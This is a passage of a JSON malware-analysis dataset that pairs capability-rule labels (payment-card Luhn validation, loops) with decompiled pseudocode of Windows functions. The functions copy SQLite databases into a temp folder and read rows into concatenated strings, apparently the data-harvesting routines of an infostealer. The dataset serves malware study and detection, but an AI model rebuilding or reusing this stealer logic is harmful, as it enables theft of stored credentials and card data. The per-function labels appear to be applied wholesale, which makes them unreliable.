var_114h = fcn.0042a209(iVar2 + 1);\n            (**0x469214)(iVar1, var_114h, iVar2, &var_118h, 0);\n            iVar2 = (**0x4690d8)(var_114h, *0x457e90);\n            while (iVar2 != 0) {\n                iVar1 = (**0x469150)(*0x457e90);\n                iVar1 = iVar2 + 3 + iVar1;\n                iVar2 = (**0x4690d8)(iVar1, *0x458104);\n                *(iVar2 + -3) = 0;\n                (**0x469258)(arg_14h, 0x44540c);\n                (**0x469258)(arg_14h, *0x4581b4);\n                (**0x469258)(arg_14h, var_110h);\n                (**0x469258)(arg_14h, 0x44540c);\n                (**0x469258)(arg_14h, *0x4584bc);\n                (**0x469258)(arg_14h, iVar1);\n                (**0x469258)(arg_14h, 0x44540c);\n                iVar2 = (**0x4690d8)(iVar2 + -2, *0x458350);\n                iVar1 = (**0x469150)(*0x458350);\n                iVar1 = iVar2 + 3 + iVar1;\n                iVar2 = (**0x4690d8)(iVar1, *0x45834c);\n                *(iVar2 + -3) = 0;\n                (**0x469258)(arg_14h, *0x457f78);\n                uVar3 = fcn.00415760(iVar1);\n                (**0x469258)(arg_14h, uVar3);\n                (**0x469258)(arg_14h, 0x44540c);\n                iVar2 = (**0x4690d8)(iVar2 + -2, *0x45834c);\n                iVar1 = (**0x469150)(*0x45834c);\n                iVar1 = iVar2 + 3 + iVar1;\n                iVar2 = (**0x4690d8)(iVar1, *0x4584d0);\n                *(iVar2 + -3) = 0;\n                (**0x469258)(arg_14h, *0x458478);\n                uVar3 = fcn.00415760(iVar1);\n                (**0x469258)(arg_14h, uVar3);\n                (**0x469258)(arg_14h, 0x447030);\n                iVar2 = (**0x4690d8)(iVar2 + -2, *0x457e90);\n                iVar1 = var_10ch;\n            }\n            (**0x4690f0)(iVar1);\n        }\n        (**0x4587c0)();\n    }\n    fcn.0042ad2a(var_118h);\n    return;\n}\n",
        "token_count": 1054
    },
    "004164b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004164b0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint *arg_8h_00;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_215h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    fcn.0042acb0(&var_20ch, 0, 0x104);\n    (**0x469258)(&var_20ch, *0x458374);\n    uVar1 = fcn.00420ef0(0x1a);\n    (**0x469258)(&var_20ch, uVar1);\n    (**0x469100)(arg_8h, &var_20ch, 1);\n    fcn.0042acb0(&var_108h, 0, 0x104);\n    (**0x469258)(&var_108h, 0x445418);\n    (**0x469258)(&var_108h, *0x4583e0);\n    (**0x469258)(&var_108h, 0x445418);\n    (**0x469258)(&var_108h, arg_10h);\n    (**0x469258)(&var_108h, 0x447474);\n    arg_8h_00 = &var_108h;\n    (**0x469258)(arg_8h_00, arg_ch);\n    (**0x469258)(&var_108h, 0x445410);\n    uVar1 = *0x457f00;\n    iVar2 = (**0x4587b8)(&var_20ch, &var_21ch);\n    if (iVar2 == 0) {\n        iVar2 = (**0x458764)(var_21ch, uVar1, 0xffffffff, &var_215h + 1, 0);\n        if (iVar2 == 0) {\n            uVar1 = (**0x4692b4)(0, 999999);\n            var_210h = (**0x46923c)(uVar1);\n            iVar2 = (**0x458780)(stack0xfffffde8);\n            while (iVar2 == 100) {\n                uVar1 = (**0x4587a4)(unique0x10000490, 0);\n                uVar3 = (**0x4587a4)(stack0xfffffde8, 1);\n                uVar4 = (**0x4587a4)(stack0xfffffde8, 2);\n                uVar5 = (**0x4587a4)(stack0xfffffde8, 3);\n                uVar6 = (**0x4587a4)(stack0xfffffde8, 4);\n                uVar7 = (**0x4587a4)(stack0xfffffde8, 5);\n                uVar8 = (**0x4587a4)(stack0xfffffde8, 6);\n                iVar2 = (**0x469288)(uVar3, 0x447470);\n                if (iVar2 == 0) {\n                    fcn.0042acb0(uVar3, 0, 4);\n                    uVar9 = 0x447468;\n                }\n                else {\n                    fcn.0042acb0(uVar3, 0, 4);\n                    uVar9 = 0x447460;\n                }\n                (**0x469258)(uVar3, uVar9);\n                iVar2 = (**0x469288)(uVar5, 0x447470);\n                if (iVar2 == 0) {\n                    fcn.0042acb0(uVar5, 0, 4);\n                    uVar9 = 0x447468;\n                }\n                else {\n                    fcn.0042acb0(uVar5, 0, 4);\n                    uVar9 = 0x447460;\n                }\n                (**0x469258)(uVar5, uVar9);\n                (**0x469258)(var_210h, uVar1);\n                (**0x469258)(var_210h, 0x44745c);\n                (**0x469258)(var_210h, uVar3);\n                (**0x469258)(var_210h, 0x44745c);\n                (**0x469258)(var_210h, uVar4);\n                (**0x469258)(var_210h, 0x44745c);\n                (**0x469258)(var_210h, uVar5);\n                (**0x469258)(var_210h, 0x44745c);\n                (**0x469258)(var_210h, uVar6);\n                (**0x469258)(var_210h, 0x44745c);\n                (**0x469258)(var_210h, uVar7);\n                (**0x469258)(var_210h, 0x44745c);\n                (**0x469258)(var_210h, uVar8);\n                (**0x469258)(var_210h, 0x44540c);\n                iVar2 = (**0x458780)(stack0xfffffde8);\n            }\n            uVar1 = (**0x469150)(var_210h);\n            fcn.00429fe0(arg_14h, &var_108h, var_210h, uVar1);\n            fcn.0042acb0(&var_210h, 0, 4);\n        }\n        (**0x458784)(stack0xfffffde8);\n        (**0x4587bc)(var_21ch);\n    }\n    (**0x46915c)(&var_20ch);\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1390
    },
    "004168c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004168c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_220h;\n    uint var_21ch;\n    uint var_215h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    fcn.0042acb0(&var_108h, 0, 0x104);\n    (**0x469258)(&var_108h, *0x458374);\n    uVar1 = fcn.00420ef0(0x1a);\n    (**0x469258)(&var_108h, uVar1);\n    uVar1 = 1;\n    (**0x469100)(arg_8h, &var_108h);\n    fcn.0042acb0(&var_20ch, 0, 0x104);\n    (**0x4690ac)(&var_20ch, 0x447430, arg_10h, arg_ch);\n    uVar3 = *0x457fcc;\n    iVar2 = (**0x4587b8)(&var_108h, &var_21ch);\n    if (iVar2 == 0) {\n        iVar2 = (**0x458764)(var_21ch, uVar3, 0xffffffff, &var_215h + 1, 0);\n        if (iVar2 == 0) {\n            uVar3 = (**0x4692b4)(0, 999999);\n            var_210h = (**0x46923c)(uVar3);\n            iVar2 = (**0x458780)(stack0xfffffde8);\n            while (iVar2 == 100) {\n                uVar3 = (**0x4587a4)(unique0x10000250, 0);\n                (**0x469258)(var_210h, uVar3);\n                (**0x469258)(var_210h, 0x44540c);\n                iVar2 = (**0x458780)(stack0xfffffde8);\n            }\n            uVar3 = (**0x469150)(var_210h);\n            fcn.00429fe0(arg_14h, &var_20ch, var_210h, uVar3);\n            fcn.0042acb0(&var_210h, 0, 4);\n        }\n        (**0x458784)(stack0xfffffde8);\n        (**0x4587bc)(var_21ch);\n    }\n    (**0x46915c)(&var_108h);\n    fcn.0042ad2a(uVar1);\n    return;\n}\n",
        "token_count": 631
    },
    "00416aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416aa0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint var_220h;\n    uint var_21ch;\n    uint var_215h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    fcn.0042acb0(&var_108h, 0, 0x104);\n    (**0x469258)(&var_108h, *0x458374);\n    uVar1 = fcn.00420ef0(0x1a);\n    (**0x469258)(&var_108h, uVar1);\n    uVar1 = 1;\n    (**0x469100)(arg_8h, &var_108h);\n    fcn.0042acb0(&var_20ch, 0, 0x104);\n    (**0x4690ac)(&var_20ch, 0x44741c, arg_10h, arg_ch);\n    uVar3 = str.._AV__basic_istream_DU__char_traits_D_std___std__._0_4_;\n    iVar2 = (**0x4587b8)(&var_108h, &var_21ch);\n    if (iVar2 == 0) {\n        iVar2 = (**0x458764)(var_21ch, uVar3, 0xffffffff, &var_215h + 1, 0);\n        if (iVar2 == 0) {\n            uVar3 = (**0x4692b4)(0, 999999);\n            var_210h = (**0x46923c)(uVar3);\n            iVar2 = (**0x458780)(stack0xfffffde8);\n            while (iVar2 == 100) {\n                uVar3 = (**0x4587a4)(unique0x10000283, 0);\n                uVar4 = (**0x4587a4)(stack0xfffffde8, 1);\n                (**0x469258)(var_210h, uVar3);\n                (**0x469258)(var_210h, 0x44745c);\n                (**0x469258)(var_210h, uVar4);\n                (**0x469258)(var_210h, 0x44540c);\n                iVar2 = (**0x458780)(stack0xfffffde8);\n            }\n            uVar3 = (**0x469150)(var_210h);\n            fcn.00429fe0(arg_14h, &var_20ch, var_210h, uVar3);\n            fcn.0042acb0(&var_210h, 0, 4);\n        }\n        (**0x458784)(stack0xfffffde8);\n        (**0x4587bc)(var_21ch);\n    }\n    (**0x46915c)(&var_108h);\n    fcn.0042ad2a(uVar1);\n    return;\n}\n",
        "token_count": 712
    },
    "00418540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418540(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint *arg_8h_00;\n    uint var_214h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    fcn.0042acb0(&var_20ch, 0, 0x104);\n    fcn.0042acb0(&var_108h, 0, 0x104);\n    uVar1 = fcn.00421020(0x1a);\n    (**0x469258)(&var_20ch, uVar1);\n    (**0x469258)(&var_20ch, arg_8h);\n    (**0x469258)(&var_108h, &var_20ch);\n    (**0x469258)(&var_108h, 0x447924);\n    (**0x469258)(&var_108h, 0x447920);\n    (**0x469258)(&var_108h, 0x44791c);\n    (**0x469258)(&var_108h, 0x447918);\n    (**0x469258)(&var_108h, 0x447914);\n    (**0x469258)(&var_108h, 0x447910);\n    (**0x469258)(&var_108h, 0x44727c);\n    (**0x469258)(&var_108h, 0x447278);\n    arg_8h_00 = &var_108h;\n    (**0x469258)(arg_8h_00, 0x447270);\n    (**0x469258)(&var_108h, 0x447908);\n    iVar2 = fcn.00420f90(&var_108h);\n    if (iVar2 != 0) {\n        fcn.00410180();\n        iVar2 = fcn.00418390(*0x458374);\n        if (iVar2 != 0) {\n            fcn.00416cb0(0x4453cc, &var_20ch, arg_ch, *(in_ECX + 0x20), arg_10h);\n        }\n        (**0x469314)(*0x4587ac);\n    }\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 566
    },
    "004186f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004186f0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    var_4h = fcn.0042b9b1(0x20);\n    iVar1 = fcn.00405920(arg_8h, arg_ch, 0, var_4h);\n    arg_8h_00 = var_4h;\n    if (iVar1 == 0) {\n        if (var_4h != 0) {\n            *0x458764 = fcn.004059f0(var_4h, *0x457de0);\n            *0x458780 = fcn.004059f0(arg_8h_00, *0x4581ac);\n            *0x4587bc = fcn.004059f0(arg_8h_00, *0x45843c);\n            *0x4587a4 = fcn.004059f0(arg_8h_00, *0x458180);\n            *0x458794 = fcn.004059f0(arg_8h_00, *0x4584a8);\n            *0x4587b8 = fcn.004059f0(arg_8h_00, *0x458240);\n            *0x45878c = fcn.004059f0(arg_8h_00, *0x45830c);\n            *0x458784 = fcn.004059f0(arg_8h_00, *0x4581c0);\n            return 1;\n        }\n    }\n    else {\n        fcn.0042acb0(&var_4h, 0, 4);\n    }\n    return 0;\n}\n",
        "token_count": 399
    },
    "00418880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418880(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.0042a214(arg_8h & 0xff, in_ECX + 8);\n    return;\n}\n",
        "token_count": 56
    },
    "004188a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.004188a0(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t in_ECX;\n    \n    if (arg_8h != arg_ch) {\n        do {\n            uVar1 = fcn.0042a214(*arg_8h, in_ECX + 8);\n            *arg_8h = uVar1;\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 135
    },
    "004188d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004188d0(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.0042a917(arg_8h & 0xff, in_ECX + 8);\n    return;\n}\n",
        "token_count": 57
    },
    "004188f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.004188f0(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t in_ECX;\n    \n    if (arg_8h != arg_ch) {\n        do {\n            uVar1 = fcn.0042a917(*arg_8h, in_ECX + 8);\n            *arg_8h = uVar1;\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return arg_8h;\n}\n",
        "token_count": 135
    },
    "00418930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00418930(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    fcn.0042af40(arg_10h, arg_8h, arg_ch - arg_8h);\n    return arg_ch;\n}\n",
        "token_count": 65
    },
    "00418970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00418970(int32_t arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    fcn.0042af40(arg_14h, arg_8h, arg_ch - arg_8h);\n    return arg_ch;\n}\n",
        "token_count": 71
    },
    "00419080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00419080(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    \n    iVar1 = 0;\n    if (arg_8h != 0) {\n        if ((arg_8h < 0x924924a) && (iVar1 = fcn.0042b9b1(arg_8h * 0x1c),  iVar1 != 0)) {\n            return iVar1;\n        }\n        arg_8h = 0;\n        fcn.0042b329(&arg_8h);\n        var_ch = 0x4453c4;\n        iVar1 = fcn.0042ba31(&var_ch, 0x44c830);\n    }\n    return iVar1;\n}\n",
        "token_count": 173
    },
    "00419140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419140(int32_t arg_8h)\n\n{\n    int32_t arg_ch;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e974;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.0042a3db(0);\n    *(in_ECX + 4) = 0;\n    *(in_ECX + 8) = 0;\n    *(in_ECX + 0xc) = 0;\n    *(in_ECX + 0x10) = 0;\n    *(in_ECX + 0x14) = 0;\n    *(in_ECX + 0x18) = 0;\n    *(in_ECX + 0x1c) = 0;\n    *(in_ECX + 0x20) = 0;\n    var_4h = 4;\n    arg_ch = arg_8h;\n    if (arg_8h == 0) {\n        arg_8h = 0x447a24;\n        fcn.0042b329(&arg_8h);\n        var_1ch = 0x4473bc;\n        arg_ch = fcn.0042ba31(&var_1ch, 0x44d4dc);\n    }\n    fcn.0042a5f7(in_ECX, arg_ch);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 374
    },
    "004191f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004191f0(int32_t param_1)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43e9c4;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 4;\n    fcn.0042a584(param_1);\n    if (*(param_1 + 0x1c) != 0) {\n        fcn.0042aeff(*(param_1 + 0x1c));\n    }\n    *(param_1 + 0x1c) = 0;\n    if (*(param_1 + 0x14) != 0) {\n        fcn.0042aeff(*(param_1 + 0x14));\n    }\n    *(param_1 + 0x14) = 0;\n    if (*(param_1 + 0xc) != 0) {\n        fcn.0042aeff(*(param_1 + 0xc));\n    }\n    *(param_1 + 0xc) = 0;\n    if (*(param_1 + 4) != 0) {\n        fcn.0042aeff(*(param_1 + 4));\n    }\n    *(param_1 + 4) = 0;\n    var_4h = 0xffffffff;\n    fcn.0042a403();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 344
    },
    "00419b00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00419b00(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint arg_10h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x54) != 0) {\n        if ((arg_8h == 0) && ((arg_ch | arg_10h) == 0)) {\n            arg_10h_00 = 4;\n        }\n        else {\n            arg_10h_00 = 0;\n        }\n        iVar1 = fcn.0042e2d5(*(in_ECX + 0x54), arg_8h, arg_10h_00, arg_ch);\n        if (iVar1 == 0) {\n            fcn.00419400(*(in_ECX + 0x54), 1);\n            return in_ECX;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 217
    },
    "00419d50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419d50(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    int32_t in_ECX;\n    \n    piVar2 = fcn.00419c10(arg_8h);\n    cVar1 = (**(*piVar2 + 4))();\n    if (cVar1 != '\\0') {\n        *(in_ECX + 0x44) = 0;\n        return;\n    }\n    *(in_ECX + 0x44) = piVar2;\n    fcn.00419020();\n    return;\n}\n",
        "token_count": 133
    },
    "0041a810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a810(uint *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = arg_18h;\n    var_8h = arg_14h;\n    if ((((*(in_ECX + 0x54) != 0) && (cVar2 = fcn.0041a090(),  cVar2 != '\\0')) &&\n        (iVar3 = fcn.0042e787(*(in_ECX + 0x54), &var_8h),  iVar3 == 0)) &&\n       ((((arg_ch | arg_10h) == 0 || (iVar3 = fcn.0042e708(*(in_ECX + 0x54), arg_ch, arg_10h, 1),  iVar3 == 0)) &&\n        (iVar3 = fcn.0042e611(*(in_ECX + 0x54), &var_8h),  iVar3 == 0)))) {\n        *(in_ECX + 0x4c) = arg_1ch;\n        fcn.00418ff0();\n        arg_8h[2] = var_8h;\n        uVar1 = *(in_ECX + 0x4c);\n        *arg_8h = 0;\n        arg_8h[1] = 0;\n        arg_8h[3] = var_4h;\n        arg_8h[4] = uVar1;\n        return;\n    }\n    *arg_8h = *0x4488e8;\n    arg_8h[1] = *0x4488ec;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    return;\n}\n",
        "token_count": 463
    },
    "0041a8f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041a8f0(int32_t param_1)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (*(param_1 + 0x54) != 0) {\n        cVar2 = fcn.0041a090();\n        iVar4 = param_1;\n        if (cVar2 == '\\0') {\n            iVar4 = 0;\n        }\n        iVar3 = fcn.0042e82f(*(param_1 + 0x54));\n        if (iVar3 == 0) goto code_r0x0041a91b;\n    }\n    iVar4 = 0;\ncode_r0x0041a91b:\n    *(param_1 + 0x10) = param_1 + 8;\n    *(param_1 + 0x50) = 0;\n    *(param_1 + 0x49) = 0;\n    *(param_1 + 0x20) = param_1 + 0x18;\n    *(param_1 + 0x24) = param_1 + 0x1c;\n    *(param_1 + 0x14) = param_1 + 0xc;\n    *(param_1 + 0x30) = param_1 + 0x28;\n    *(param_1 + 0x34) = param_1 + 0x2c;\n    *(param_1 + 0xc) = 0;\n    **(param_1 + 0x24) = 0;\n    **(param_1 + 0x34) = 0;\n    **(param_1 + 0x10) = 0;\n    **(param_1 + 0x20) = 0;\n    **(param_1 + 0x30) = 0;\n    *(param_1 + 0x54) = 0;\n    uVar1 = *0x468800;\n    *(param_1 + 0x44) = 0;\n    *(param_1 + 0x4c) = uVar1;\n    return iVar4;\n}\n",
        "token_count": 482
    },
    "0041a980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a980(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    \n    if (in_ECX != arg_8h) {\n        if (7 < in_ECX[5]) {\n            fcn.0042ac49(*in_ECX);\n        }\n        in_ECX[5] = 7;\n        in_ECX[4] = 0;\n        *in_ECX = 0;\n        if (arg_8h[5] < 8) {\n            fcn.0042b4b0(in_ECX, arg_8h, arg_8h[4] * 2 + 2);\n        }\n        else {\n            *in_ECX = *arg_8h;\n            *arg_8h = 0;\n        }\n        in_ECX[4] = arg_8h[4];\n        in_ECX[5] = arg_8h[5];\n        arg_8h[4] = 0;\n        arg_8h[5] = 0;\n    }\n    return;\n}\n",
        "token_count": 235
    },
    "0041ae20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ae20(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint arg_10h_00;\n    uint arg_ch_00;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint arg_18h_00;\n    uint *arg_8h_00;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_135h;\n    uint *var_130h;\n    uint var_120h;\n    uint32_t var_11ch;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ec5b;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_13ch = arg_8h;\n    var_140h = arg_10h;\n    fcn.0042acb0(&var_114h, 0, 0x104, var_10h);\n    (**0x469258)(&var_114h, *0x458374);\n    uVar1 = fcn.00420ef0(0x1a);\n    arg_8h_00 = &var_114h;\n    (**0x469258)(arg_8h_00, uVar1);\n    (**0x469100)(arg_ch, &var_114h, 1);\n    uVar1 = *0x458174;\n    iVar2 = (**0x4587b8)(&var_114h, &var_144h);\n    if (iVar2 == 0) {\n        iVar2 = (**0x458764)(var_144h, uVar1, 0xffffffff, &var_135h + 1, 0);\n        if (iVar2 == 0) {\n            iVar2 = (**0x458780)(stack0xfffffec8);\n            while (iVar2 == 100) {\n                uVar3 = (**0x4587a4)(unique0x100003ad, 0);\n                uVar4 = (**0x4587a4)(stack0xfffffec8, 1);\n                uVar1 = arg_14h;\n                arg_18h_00 = arg_18h;\n                arg_10h_00 = (**0x45878c)(stack0xfffffec8, 2);\n                arg_ch_00 = (**0x458794)(stack0xfffffec8, 2);\n                fcn.0041ac80(&var_130h, arg_ch_00, arg_10h_00, uVar1, arg_18h_00);\n                var_4h = 0;\n                puVar5 = var_130h;\n                if (var_11ch < 0x10) {\n                    puVar5 = &var_130h;\n                }\n                iVar2 = (**0x469288)(puVar5, 0x4453cc);\n                if ((iVar2 != 0) || (iVar2 = (**0x469288)(uVar4, 0x4453cc),  iVar2 != 0)) {\n                    (**0x469258)(arg_1ch, 0x44540c);\n                    (**0x469258)(arg_1ch, *0x4581b4);\n                    (**0x469258)(arg_1ch, var_140h);\n                    (**0x469258)(arg_1ch, 0x44702c);\n                    (**0x469258)(arg_1ch, var_13ch);\n                    (**0x469258)(arg_1ch, 0x447028);\n                    (**0x469258)(arg_1ch, *0x4584bc);\n                    (**0x469258)(arg_1ch, uVar3);\n                    (**0x469258)(arg_1ch, 0x44540c);\n                    (**0x469258)(arg_1ch, *0x457f78);\n                    (**0x469258)(arg_1ch, uVar4);\n                    (**0x469258)(arg_1ch, 0x44540c);\n                    (**0x469258)(arg_1ch, *0x458478);\n                    puVar5 = var_130h;\n                    if (var_11ch < 0x10) {\n                        puVar5 = &var_130h;\n                    }\n                    (**0x469258)(arg_1ch, puVar5);\n                    (**0x469258)(arg_1ch, 0x447030);\n                }\n                var_4h = 0xffffffff;\n                if (0xf < var_11ch) {\n                    fcn.0042ac49(var_130h);\n                }\n                var_11ch = 0xf;\n                var_120h = 0;\n                var_130h = var_130h & 0xffffff00;\n                iVar2 = (**0x458780)(stack0xfffffec8);\n            }\n        }\n        (**0x458784)(stack0xfffffec8);\n        (**0x4587bc)(var_144h);\n    }\n    (**0x46915c)(&var_114h);\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1259
    },
    "0041b130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b130(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    char *pcVar6;\n    uint uVar7;\n    uint *puVar8;\n    uint unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uint uVar9;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_23dh;\n    uint var_238h;\n    uint32_t var_234h;\n    uint var_224h;\n    uint32_t var_220h;\n    uint var_218h;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ec9b;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar1 = (**0x469288)(arg_10h, *0x4580e8, var_10h);\n    if (iVar1 == 0) {\n        arg_ch = 0x4453cc;\n    }\n    else {\n        iVar1 = (**0x469288)(arg_10h, *0x458110);\n        if (iVar1 == 0) {\n            arg_ch = 0x4453cc;\n        }\n        else {\n            iVar1 = (**0x469288)(arg_ch, *0x4583ec);\n            if (iVar1 == 0) goto code_r0x0041b629;\n        }\n    }\n    fcn.0042acb0(&var_218h, 0, 0x104);\n    (**0x469258)(&var_218h, *0x458374);\n    uVar2 = fcn.00420ef0(0x1a);\n    (**0x469258)(&var_218h, uVar2);\n    (**0x469100)(arg_8h, &var_218h, 1);\n    fcn.0042acb0(&var_114h, 0, 0x104);\n    (**0x469258)(&var_114h, 0x445418);\n    